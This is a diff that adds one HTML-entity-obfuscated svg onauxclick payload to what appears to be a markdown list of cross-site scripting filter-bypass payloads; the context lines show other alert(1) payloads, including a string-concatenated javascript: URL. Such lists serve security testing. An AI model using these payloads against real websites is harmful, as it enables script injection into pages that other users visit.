@@ -213,6 +213,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   -20a")});a=alert;a(1);//
   valor%0aalert(1)%3C/script%3E
   <svg onload=a=')',b='t(1',j='javas',s='cript:aler',location=j+s+b+a>
+  "/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\1\)>
   ```
 </details>
 
